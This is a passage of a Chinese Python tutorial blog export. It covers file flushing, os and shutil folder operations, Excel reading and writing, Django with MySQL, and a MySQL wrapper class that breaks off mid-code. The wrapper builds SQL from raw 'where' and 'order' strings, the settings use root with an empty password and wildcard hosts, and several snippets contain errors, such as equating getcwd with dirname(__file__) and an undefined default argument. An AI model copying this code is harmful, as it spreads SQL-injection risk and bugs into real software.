<h3 id="flush方法"><a href="#flush方法" class="headerlink" title="flush方法"></a>flush方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f = open(&quot;file_test&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)</span><br><span class="line">f.write(&quot;hello\n&quot;)</span><br><span class="line">f.write(&quot;hello\n&quot;)</span><br><span class="line">f.write(&quot;hello\n&quot;)</span><br><span class="line">f.flush()</span><br></pre></td></tr></table></figure>
<ul>
<li>一般的文件流操作都包含缓冲机制，write方法并不直接将数据写入文件，而是先写入内存中特定的缓冲区。</li>
<li>flush方法是用来刷新缓冲区的，即将缓冲区中的数据立刻写入文件，同时清空缓冲区。</li>
<li>正常情况下缓冲区满时，操作系统会自动将缓冲数据写入到文件中。</li>
<li>至于close方法，原理是内部先调用flush方法来刷新缓冲区，再执行关闭操作，这样即使缓冲区数据未满也能保证数据的完整性。</li>
<li>如果进程意外退出或正常退出时而未执行文件的close方法，缓冲区中的内容将会丢失。</li>
<li><strong>但有时你需要在关闭前刷新到硬盘中，这时就可以使用 flush() 方法</strong></li>
</ul>
<h2 id="操作文件夹"><a href="#操作文件夹" class="headerlink" title="操作文件夹"></a>操作文件夹</h2><ul>
<li>判断路径或文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.path.isabs(...) 　　　　 <span class="comment"># 判断是否绝对路径</span></span><br><span class="line">os.path.exists(...)　　　　 <span class="comment"># 判断是否真实存在</span></span><br><span class="line">os.path.isdir(...)　　　　   <span class="comment"># 判断是否是个目录</span></span><br><span class="line">os.path.isfile(...)　　　　   <span class="comment"># 判断是否是个文件</span></span><br></pre></td></tr></table></figure>
<ul>
<li>工作目录及创建文件夹操作<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.getcwd() 　　　　  <span class="comment"># 获取当前工作目录 等同于os.path.dirname(__file__) </span></span><br><span class="line">os.chdir(<span class="string">&quot;.\\test_mkdir&quot;</span>) <span class="comment"># 改变工作目录,. 表示本级目录； .. 表示上级目录</span></span><br><span class="line">os.listdir(...)　　　　  <span class="comment"># 列出目录下的文件</span></span><br><span class="line">os.mkdir(...)　　　　  <span class="comment"># 创建单个目录    </span></span><br><span class="line">os.makedirs(...)　　  <span class="comment"># 创建多级目</span></span><br></pre></td></tr></table></figure></li>
<li>删除文件夹、文件<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.rmdir(...) <span class="comment"># 删除空文件夹 </span></span><br><span class="line">os.remove(...) <span class="comment"># 删除单一文件</span></span><br><span class="line">shutil.rmtree(...) <span class="comment"># 删除文件夹及其下所有文</span></span><br></pre></td></tr></table></figure></li>
<li>重命名文件夹&#x2F;文件<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.rename(oldfileName, newFilename)</span><br></pre></td></tr></table></figure></li>
<li>复制文件&#x2F;文件夹<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shutil.copyfile(<span class="string">&quot;old&quot;</span>,<span class="string">&quot;new&quot;</span>) <span class="comment"># 复制文件，都只能是文件</span></span><br><span class="line">shutil.copytree(<span class="string">&quot;old&quot;</span>,<span class="string">&quot;new&quot;</span>) <span class="comment"># 复制文件夹，都只能是目录，且new必须不存在</span></span><br><span class="line">shutil.copy(<span class="string">&quot;old&quot;</span>,<span class="string">&quot;new&quot;</span>)　　<span class="comment"># 复制文件/文件夹。经过测试，直接复制文件夹，报权限问题；直接复制文件正常</span></span><br><span class="line">shutil.move(<span class="string">&quot;old&quot;</span>,<span class="string">&quot;new&quot;</span>)  　<span class="comment"># 移动文件/文件夹至 new 文件夹中</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="进入到相对文件目录"><a href="#进入到相对文件目录" class="headerlink" title="进入到相对文件目录"></a>进入到相对文件目录</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># os.path.dirname(__file__) 表示得到当前目录路径等同于os.getcwd()</span></span><br><span class="line">PATH = <span class="keyword">lambda</span> p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 得到当前目录的t1文件夹</span></span><br><span class="line">PATH(<span class="string">&quot;t1&quot;</span>)</span><br><span class="line"><span class="comment"># 得到上级目录的t1文件夹</span></span><br><span class="line">PATH(<span class="string">&quot;.../t1&quot;</span>)</span><br><span class="line"><span class="comment"># 得到上级目录的log文件夹下的t1文件夹</span></span><br><span class="line">PATH(<span class="string">&quot;.../log/t1&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="引用公共模块"><a href="#引用公共模块" class="headerlink" title="引用公共模块"></a>引用公共模块</h3><ul>
<li>在不同的项目中，需要引用到当前项目的公用方法<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 得到当前文件绝对路径</span></span><br><span class="line">abs_path = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"><span class="comment"># 得到公共用例目录，采用切割项目名的方法</span></span><br><span class="line">common_path = os.path.join(abs_path.split(<span class="string">&quot;airtest_auto&quot;</span>)[<span class="number">0</span>], <span class="string">&quot;airtest_auto&quot;</span>, <span class="string">&quot;util&quot;</span>)</span><br><span class="line"><span class="comment"># 导入到公用目录</span></span><br><span class="line">sys.path.append(common_path)</span><br><span class="line"><span class="keyword">from</span> app_util <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="得到目录下的所有文件和文件夹"><a href="#得到目录下的所有文件和文件夹" class="headerlink" title="得到目录下的所有文件和文件夹"></a>得到目录下的所有文件和文件夹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&quot;t3&quot;</span>, topdown=<span class="literal">False</span>):</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">        <span class="built_in">print</span>(os.path.join(root, name))</span><br><span class="line">        <span class="comment"># t3\t2\t2_1\t2_1_1\t2_1_1.air</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;====打印文件======&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> dirs:</span><br><span class="line">        <span class="built_in">print</span>(os.path.join(root, name))</span><br><span class="line">        <span class="comment"># t3\t2\t2_1\t2_1_1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;====打印目录=========&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="得到文件夹下的某些文件"><a href="#得到文件夹下的某些文件" class="headerlink" title="得到文件夹下的某些文件"></a>得到文件夹下的某些文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">&quot;t1&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> i.find(<span class="string">&quot;txt&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(os.path.join(<span class="string">&quot;t1&quot;</span>, i))</span><br></pre></td></tr></table></figure>
<h3 id="得到文件夹下的修改时间排序的文件"><a href="#得到文件夹下的修改时间排序的文件" class="headerlink" title="得到文件夹下的修改时间排序的文件"></a>得到文件夹下的修改时间排序的文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 得到父目录的绝对路径</span></span><br><span class="line">abs_parent = os.path.abspath(<span class="string">&quot;t1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort_file_by_time</span>(<span class="params">file_path</span>):</span><br><span class="line">    files = os.listdir(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> files:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># os.path.getmtime表示文件最近修改的时间</span></span><br><span class="line">        <span class="comment"># sorted 里面的reverse为True就是降序，为False就是增序</span></span><br><span class="line">        files = <span class="built_in">sorted</span>(files, key=<span class="keyword">lambda</span> x: os.path.getmtime(os.path.join(file_path, x)), reverse=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> files</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sort_file_by_time(abs_parent))</span><br></pre></td></tr></table></figure>

<h2 id="参考如下"><a href="#参考如下" class="headerlink" title="参考如下"></a>参考如下</h2><ul>
<li><a href="https://blog.csdn.net/weixin_44239490/article/details/86252212">python 文件、文件夹详细操作</a></li>
<li><a href="https://www.cnblogs.com/Stephen-Qin/p/10296283.html">python按修改时间顺序排列文件</a></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-读写excel</title>
    <url>/aposts/791e1968/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import  sys</span><br><span class="line">import xlrd</span><br><span class="line">#https://pypi.python.org/pypi/xlrd/0.9.3</span><br><span class="line">import xlsxwriter</span><br><span class="line">#https://pypi.python.org/pypi/XlsxWriter/0.6.6#downloads</span><br><span class="line">def read_excel(file=&#x27;c:/test.xls&#x27;):</span><br><span class="line">    data = xlrd.open_workbook(file)</span><br><span class="line">    table = data.sheet_by_index(0)</span><br><span class="line">    nrows = table.nrows</span><br><span class="line">    ncols = table.ncols</span><br><span class="line">    colnames = table.row_values(0) #one rows data</span><br><span class="line">    list = []</span><br><span class="line">    for rownum in range(1, nrows):</span><br><span class="line">        row = table.row_values(rownum)</span><br><span class="line">        if row:</span><br><span class="line">            app = &#123;&#125;</span><br><span class="line">            for i in range(len(colnames)):</span><br><span class="line">                row[i] = colnames[i] + row[i]</span><br><span class="line">                app[colnames[i]] = row[i]</span><br><span class="line">            list.append(app)</span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line">def write_excel(file=&#x27;d:/result.xlsx&#x27;, httpurl=[&quot;&quot;,&quot;&quot;], httpmethod=get, response_time=[0,10,14,0]):</span><br><span class="line">    workbook = xlsxwriter.Workbook(file)</span><br><span class="line">    worksheet = workbook.add_worksheet()</span><br><span class="line">    #worksheet.set_column(&#x27;A:A&#x27;, 20)</span><br><span class="line">    worksheet.write(0, 0, &quot;接口URL&quot;)</span><br><span class="line">    worksheet.write(0, 1, &quot;请求方法&quot;)</span><br><span class="line">    worksheet.write(0, 2, &quot;响应时间&quot;)</span><br><span class="line">    for i in range(len(response_time)):</span><br><span class="line">        worksheet.write(i + 1, 0, httpurl[i])</span><br><span class="line">        worksheet.write(i + 1, 1, httpmethod)</span><br><span class="line">        if response_time[i] == 0:</span><br><span class="line">            worksheet.write(i + 1, 2, &quot;请求超时&quot;)</span><br><span class="line">        else:</span><br><span class="line">             worksheet.write(i + 1, 2, response_time[i])</span><br><span class="line">    #worksheet.insert_image(&#x27;B5&#x27;, &#x27;logo.png&#x27;)</span><br><span class="line">    workbook.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python3+django安装mysql</title>
    <url>/aposts/d4161507/</url>
    <content><![CDATA[<ul>
<li>这将会在你的当前目录下生成一个 mysite 目录</li>
</ul>
<p><code>admin startproject mysite</code>  </p>
<h2 id="新建数据库"><a href="#新建数据库" class="headerlink" title="新建数据库"></a>新建数据库</h2><ul>
<li>配置mysite下的setting.py中的数据库设置<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    &#x27;default&#x27;: &#123;</span><br><span class="line">         &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,</span><br><span class="line">        &#x27;NAME&#x27;: &#x27;test&#x27;, #数据库名字</span><br><span class="line">        &#x27;USER&#x27;: &#x27;root&#x27;,</span><br><span class="line">        &#x27;PASSWORD&#x27;: &#x27;&#x27;,</span><br><span class="line">        &#x27;HOST&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">        &#x27;PORT&#x27;: &#x27;3306&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>安装py3驱动mysql<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install PyMySQL</span><br></pre></td></tr></table></figure>
找到mysite&#x2F;mysite&#x2F;<strong>init</strong>.py,在里面输入以下内容并保存：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pymysql</span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure></li>
<li>执行下列命令<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure>
就会看到如下所示：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System check identified no issues (0 silenced).</span><br><span class="line"></span><br><span class="line">You have 13 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions.</span><br><span class="line">Run &#x27;python manage.py migrate&#x27; to apply them.</span><br><span class="line">February 06, 2017 - 14:47:11</span><br><span class="line">Django version 1.10.5, using settings &#x27;mysite.settings&#x27;</span><br><span class="line">Starting development server at http://127.0.0.1:8000/</span><br><span class="line">Quit the server with CTRL-BREAK.</span><br></pre></td></tr></table></figure></li>
<li>浏览器打开后出现个异常提示：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Of course, you haven&#x27;t actually done any work yet. Next, start your first app by running python manage.py startapp [app_label].</span><br><span class="line">You&#x27;re seeing this message because you have DEBUG = True in your Django settings file and you haven&#x27;t configured any URLs. Get to work!</span><br></pre></td></tr></table></figure></li>
<li>设置setting.py<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEBUG = False</span><br><span class="line">ALLOWED_HOSTS = [&#x27;*&#x27;]</span><br></pre></td></tr></table></figure></li>
</ul>
<p>最后再次运行:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py runserver</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>python3封装mysql操作类</title>
    <url>/aposts/7acca47a/</url>
    <content><![CDATA[<p>类视图如下</p>
<p><img src="/aposts/7acca47a/2231755-216e7506eb885f7d.png"></p>
<p>本文来自：<a href="http://www.wmhfly.com/php/python3-mysql-class.html">http://www.wmhfly.com/php/python3-mysql-class.html</a></p>
<p>我自己改造了一次，加入到自己的自动化接口测试框架里面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  FIND_BY_SQL = &quot;findBySql&quot; # 根据sql查找</span><br><span class="line">  COUNT_BY_SQL = &quot;countBySql&quot; # 自定义sql 统计影响行数</span><br><span class="line">  INSERT = &quot;insert&quot; # 插入</span><br><span class="line">  UPDATE_BY_ATTR = &quot;updateByAttr&quot; # 更新数据</span><br><span class="line">  DELETE_BY_ATTR = &quot;deleteByAttr&quot; # 删除数据</span><br><span class="line">  FIND_BY_ATTR = &quot;findByAttr&quot; # 根据条件查询一条记录</span><br><span class="line">  FIND_ALL_BY_ATTR = &quot;findAllByAttr&quot;  #根据条件查询多条记录</span><br><span class="line">  COUNT = &quot;count&quot; # 统计行</span><br><span class="line">  EXIST = &quot;exist&quot; # 是否存在该记录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import mysql.connector</span><br><span class="line">import mysql.connector.errors</span><br><span class="line">from common.customConst import Const</span><br><span class="line">class MySQLet:</span><br><span class="line">    &quot;&quot;&quot;Connection to a MySQL&quot;&quot;&quot;</span><br><span class="line">    # def __init__(self,user=&#x27;&#x27;,password=&#x27;&#x27;,database=&#x27;&#x27;,charset=None,port=3306):</span><br><span class="line">    def __init__(self,**kwargs):</span><br><span class="line">        try:</span><br><span class="line">            self._conn = mysql.connector.connect(host=kwargs[&quot;host&quot;], user=kwargs[&quot;user&quot;], password=kwargs[&quot;password&quot;],</span><br><span class="line">                                                 charset=kwargs[&quot;charset&quot;], database=kwargs[&quot;database&quot;], port=kwargs[&quot;port&quot;])</span><br><span class="line">            self.__cursor = None</span><br><span class="line">            print(&quot;连接数据库&quot;)</span><br><span class="line">            #set charset charset = (&#x27;latin1&#x27;,&#x27;latin1_general_ci&#x27;)</span><br><span class="line">        except mysql.connector.errors.ProgrammingError as err:</span><br><span class="line">            print(&#x27;mysql连接错误：&#x27; + err.msg)</span><br><span class="line"></span><br><span class="line">    # def findBySql(self, sql, params=&#123;&#125;, limit=0, join=&#x27;AND&#x27;):</span><br><span class="line">    def findBySql(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        自定义sql语句查找</span><br><span class="line">        limit = 是否需要返回多少行</span><br><span class="line">        params = dict(field=value)</span><br><span class="line">        join = &#x27;AND | OR&#x27;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        cursor = self.__getCursor()</span><br><span class="line">        # sql = self.__joinWhere(kwargs[&quot;sql&quot;], kwargs[&quot;params&quot;], kwargs[&quot;join&quot;])</span><br><span class="line">        if kwargs.get(&quot;join&quot;, 0) == 0: kwargs[&quot;join&quot;] = &quot;AND&quot;</span><br><span class="line">        sql = self.__joinWhere(**kwargs)</span><br><span class="line">        cursor.execute(sql, tuple(kwargs[&quot;params&quot;].values()))</span><br><span class="line">        rows = cursor.fetchmany(size=kwargs[&quot;limit&quot;]) if kwargs[&quot;limit&quot;] &gt; 0 else cursor.fetchall()</span><br><span class="line">        result = [dict(zip(cursor.column_names,row)) for row in rows] if rows else None</span><br><span class="line">        return len(result)</span><br><span class="line"></span><br><span class="line">    # def countBySql(self,sql,params = &#123;&#125;,join = &#x27;AND&#x27;):</span><br><span class="line">    def countBySql(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;自定义sql 统计影响行数&quot;&quot;&quot;</span><br><span class="line">        if kwargs.get(&quot;join&quot;, 0) == 0: kwargs[&quot;join&quot;] = &quot;AND&quot;</span><br><span class="line">        cursor = self.__getCursor()</span><br><span class="line">        # sql = self.__joinWhere(kwargs[&quot;sql&quot;], kwargs[&quot;params&quot;], kwargs[&quot;join&quot;])</span><br><span class="line">        sql = self.__joinWhere(**kwargs)</span><br><span class="line">        cursor.execute(sql, tuple(kwargs[&quot;params&quot;].values()))</span><br><span class="line">        result = cursor.fetchall() # fetchone是一条记录， fetchall 所有记录</span><br><span class="line">        return len(result) if result else 0</span><br><span class="line"></span><br><span class="line">    # def insert(self,table,data):</span><br><span class="line">    def insert(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;新增一条记录</span><br><span class="line">          table: 表名</span><br><span class="line">          data: dict 插入的数据</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        fields = &#x27;,&#x27;.join(&#x27;`&#x27;+k+&#x27;`&#x27; for k in kwargs[&quot;data&quot;].keys())</span><br><span class="line">        values = &#x27;,&#x27;.join((&quot;%s&quot;, ) * len(kwargs[&quot;data&quot;]))</span><br><span class="line">        sql = &#x27;INSERT INTO `%s` (%s) VALUES (%s)&#x27; % (kwargs[&quot;table&quot;], fields, values)</span><br><span class="line">        cursor = self.__getCursor()</span><br><span class="line">        cursor.execute(sql, tuple(kwargs[&quot;data&quot;].values()))</span><br><span class="line">        insert_id = cursor.lastrowid</span><br><span class="line">        self._conn.commit()</span><br><span class="line">        return insert_id</span><br><span class="line"></span><br><span class="line">    # def updateByAttr(self,table,data,params=&#123;&#125;,join=&#x27;AND&#x27;):</span><br><span class="line">    def updateByAttr(self, **kwargs):</span><br><span class="line">    #     &quot;&quot;&quot;更新数据&quot;&quot;&quot;</span><br><span class="line">        if kwargs.get(&quot;params&quot;, 0) == 0:</span><br><span class="line">            kwargs[&quot;params&quot;] = &#123;&#125;</span><br><span class="line">        if kwargs.get(&quot;join&quot;, 0) == 0:</span><br><span class="line">            kwargs[&quot;join&quot;] = &quot;AND&quot;</span><br><span class="line">        fields = &#x27;,&#x27;.join(&#x27;`&#x27; + k + &#x27;`=%s&#x27; for k in kwargs[&quot;data&quot;].keys())</span><br><span class="line">        values = list(kwargs[&quot;data&quot;].values())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        values.extend(list(kwargs[&quot;params&quot;].values()))</span><br><span class="line">        sql = &quot;UPDATE `%s` SET %s &quot; % (kwargs[&quot;table&quot;], fields)</span><br><span class="line">        kwargs[&quot;sql&quot;] = sql</span><br><span class="line">        sql = self.__joinWhere(**kwargs)</span><br><span class="line">        cursor = self.__getCursor()</span><br><span class="line">        cursor.execute(sql, tuple(values))</span><br><span class="line">        self._conn.commit()</span><br><span class="line">        return cursor.rowcount</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # def updateByPk(self,table,data,id,pk=&#x27;id&#x27;):</span><br><span class="line">    def updateByPk(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;根据主键更新，默认是id为主键&quot;&quot;&quot;</span><br><span class="line">        return self.updateByAttr(**kwargs)</span><br><span class="line"></span><br><span class="line">    # def deleteByAttr(self,table,params=&#123;&#125;,join=&#x27;AND&#x27;):</span><br><span class="line">    def deleteByAttr(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;删除数据&quot;&quot;&quot;</span><br><span class="line">        if kwargs.get(&quot;params&quot;, 0) == 0:</span><br><span class="line">            kwargs[&quot;params&quot;] = &#123;&#125;</span><br><span class="line">        if kwargs.get(&quot;join&quot;, 0) == 0:</span><br><span class="line">            kwargs[&quot;join&quot;] = &quot;AND&quot;</span><br><span class="line">        # fields = &#x27;,&#x27;.join(&#x27;`&#x27;+k+&#x27;`=%s&#x27; for k in kwargs[&quot;params&quot;].keys())</span><br><span class="line">        sql = &quot;DELETE FROM `%s` &quot; % kwargs[&quot;table&quot;]</span><br><span class="line">        kwargs[&quot;sql&quot;] = sql</span><br><span class="line">        # sql = self.__joinWhere(sql, kwargs[&quot;params&quot;], kwargs[&quot;join&quot;])</span><br><span class="line">        sql = self.__joinWhere(**kwargs)</span><br><span class="line">        cursor = self.__getCursor()</span><br><span class="line">        cursor.execute(sql, tuple(kwargs[&quot;params&quot;].values()))</span><br><span class="line">        self._conn.commit()</span><br><span class="line">        return cursor.rowcount</span><br><span class="line"></span><br><span class="line">    # def deleteByPk(self,table,id,pk=&#x27;id&#x27;):</span><br><span class="line">    def deleteByPk(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;根据主键删除，默认是id为主键&quot;&quot;&quot;</span><br><span class="line">        return self.deleteByAttr(**kwargs)</span><br><span class="line"></span><br><span class="line">    # def findByAttr(self,table,criteria = &#123;&#125;):</span><br><span class="line">    def findByAttr(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;根據條件查找一條記錄&quot;&quot;&quot;</span><br><span class="line">        return self.__query(**kwargs)</span><br><span class="line"></span><br><span class="line">    # def findByPk(self,table,id,pk=&#x27;id&#x27;):</span><br><span class="line">    def findByPk(self, **kwargs):</span><br><span class="line">        return self.findByAttr(**kwargs)</span><br><span class="line"></span><br><span class="line">    # def findAllByAttr(self,table,criteria=&#123;&#125;, whole=true):</span><br><span class="line">    def findAllByAttr(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;根據條件查找記錄&quot;&quot;&quot;</span><br><span class="line">        return self.__query(**kwargs)</span><br><span class="line"></span><br><span class="line">    # def count(self,table,params=&#123;&#125;,join=&#x27;AND&#x27;):</span><br><span class="line">    def count(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;根据条件统计行数&quot;&quot;&quot;</span><br><span class="line">        if kwargs.get(&quot;join&quot;, 0) == 0: kwargs[&quot;join&quot;] = &quot;AND&quot;</span><br><span class="line">        sql = &#x27;SELECT COUNT(*) FROM `%s`&#x27; % kwargs[&quot;table&quot;]</span><br><span class="line">        # sql = self.__joinWhere(sql, kwargs[&quot;params&quot;], kwargs[&quot;join&quot;])</span><br><span class="line">        kwargs[&quot;sql&quot;] = sql</span><br><span class="line">        sql = self.__joinWhere(**kwargs)</span><br><span class="line">        cursor = self.__getCursor()</span><br><span class="line">        cursor.execute(sql, tuple(kwargs[&quot;params&quot;].values()))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        return result[0] if result else 0</span><br><span class="line"></span><br><span class="line">    # def exist(self,table,params=&#123;&#125;,join=&#x27;AND&#x27;):</span><br><span class="line">    def exist(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;判断是否存在&quot;&quot;&quot;</span><br><span class="line">        return self.count(**kwargs) &gt; 0</span><br><span class="line"></span><br><span class="line">    def close(self):</span><br><span class="line">        &quot;&quot;&quot;关闭游标和数据库连接&quot;&quot;&quot;</span><br><span class="line">        if self.__cursor is not None:</span><br><span class="line">            self.__cursor.close()</span><br><span class="line">        self._conn.close()</span><br><span class="line"></span><br><span class="line">    def __getCursor(self):</span><br><span class="line">        &quot;&quot;&quot;获取游标&quot;&quot;&quot;</span><br><span class="line">        if self.__cursor is None:</span><br><span class="line">            self.__cursor = self._conn.cursor()</span><br><span class="line">        return self.__cursor</span><br><span class="line"></span><br><span class="line">    # def __joinWhere(self,sql,params,join):</span><br><span class="line">    def __joinWhere(self, **kwargs):</span><br><span class="line">        &quot;&quot;&quot;转换params为where连接语句&quot;&quot;&quot;</span><br><span class="line">        if kwargs[&quot;params&quot;]:</span><br><span class="line">            keys,_keys = self.__tParams(**kwargs)</span><br><span class="line">            where = &#x27; AND &#x27;.join(k+&#x27;=&#x27;+_k for k,_k in zip(keys,_keys)) if kwargs[&quot;join&quot;] == &#x27;AND&#x27; else &#x27; OR &#x27;.join(k+&#x27;=&#x27;+_k for k,_k in zip(keys,_keys))</span><br><span class="line">            kwargs[&quot;sql&quot;]+=&#x27; WHERE &#x27; + where</span><br><span class="line">        return kwargs[&quot;sql&quot;]</span><br><span class="line"></span><br><span class="line">    # def __tParams(self,params):</span><br><span class="line">    def __tParams(self, **kwargs):</span><br><span class="line">        keys = [&#x27;`&#x27;+k+&#x27;`&#x27; for k in kwargs[&quot;params&quot;].keys()]</span><br><span class="line">        _keys = [&#x27;%s&#x27; for k in kwargs[&quot;params&quot;].keys()]</span><br><span class="line">        return keys,_keys</span><br><span class="line"></span><br><span class="line">    # def __query(self,table,criteria,whole=False):</span><br><span class="line">    def __query(self, **kwargs):</span><br><span class="line">        if kwargs.get(&quot;whole&quot;, False) == False or kwargs[&quot;whole&quot;] is not True:</span><br><span class="line">            kwargs[&quot;whole&quot;] = False</span><br><span class="line">            kwargs[&quot;criteria&quot;][&#x27;limit&#x27;] = 1</span><br><span class="line">        # sql = self.__contact_sql(kwargs[&quot;table&quot;], kwargs[&quot;criteria&quot;])</span><br><span class="line">        sql = self.__contact_sql(**kwargs)</span><br><span class="line">        cursor = self.__getCursor()</span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        rows = cursor.fetchall() if kwargs[&quot;whole&quot;] else cursor.fetchone()</span><br><span class="line">        result = [dict(zip(cursor.column_names, row)) for row in rows] if kwargs[&quot;whole&quot;] else dict(zip(cursor.column_names, rows)) if rows else None</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    # def __contact_sql(self,table,criteria):</span><br><span class="line">    def __contact_sql(self, **kwargs):</span><br><span class="line">        sql = &#x27;SELECT &#x27;</span><br><span class="line">        if kwargs[&quot;criteria&quot;] and type(kwargs[&quot;criteria&quot;]) is dict:</span><br><span class="line">            #select fields</span><br><span class="line">            if &#x27;select&#x27; in kwargs[&quot;criteria&quot;]:</span><br><span class="line">                fields = kwargs[&quot;criteria&quot;][&#x27;select&#x27;].split(&#x27;,&#x27;)</span><br><span class="line">                sql+= &#x27;,&#x27;.join(&#x27;`&#x27;+field+&#x27;`&#x27; for field in fields)</span><br><span class="line">            else:</span><br><span class="line">                sql+=&#x27; * &#x27;</span><br><span class="line">            #table</span><br><span class="line">            sql+=&#x27; FROM `%s`&#x27;% kwargs[&quot;table&quot;]</span><br><span class="line">            #where</span><br><span class="line">            if &#x27;where&#x27; in kwargs[&quot;criteria&quot;]:</span><br><span class="line">                sql+=&#x27; WHERE &#x27;+ kwargs[&quot;criteria&quot;][&#x27;where&#x27;]</span><br><span class="line">            #group by</span><br><span class="line">            if &#x27;group&#x27; in kwargs[&quot;criteria&quot;]:</span><br><span class="line">                sql+=&#x27; GROUP BY &#x27;+ kwargs[&quot;criteria&quot;][&#x27;group&#x27;]</span><br><span class="line">            #having</span><br><span class="line">            if &#x27;having&#x27; in kwargs[&quot;criteria&quot;]:</span><br><span class="line">                sql+=&#x27; HAVING &#x27;+ kwargs[&quot;criteria&quot;][&#x27;having&#x27;]</span><br><span class="line">            #order by</span><br><span class="line">            if &#x27;order&#x27; in kwargs[&quot;criteria&quot;]:</span><br><span class="line">                sql+=&#x27; ORDER BY &#x27;+ kwargs[&quot;criteria&quot;][&#x27;order&#x27;]</span><br><span class="line">            #limit</span><br><span class="line">            if &#x27;limit&#x27; in kwargs[&quot;criteria&quot;]:</span><br><span class="line">                sql+=&#x27; LIMIT &#x27;+ str(kwargs[&quot;criteria&quot;][&#x27;limit&#x27;])</span><br><span class="line">            #offset</span><br><span class="line">            if &#x27;offset&#x27; in kwargs[&quot;criteria&quot;]:</span><br><span class="line">                sql+=&#x27; OFFSET &#x27;+ str(kwargs[&quot;criteria&quot;][&#x27;offset&#x27;])</span><br><span class="line">        else:</span><br><span class="line">            sql+=&#x27; * FROM `%s`&#x27;% kwargs[&quot;table&quot;]</span><br><span class="line">        return sql</span><br><span class="line">    def findKeySql(self, key ,**kwargs):</span><br><span class="line">        sqlOperate = &#123;</span><br><span class="line">        Const.COUNT: lambda: self.count(**kwargs),</span><br><span class="line">        Const.COUNT_BY_SQL: lambda: 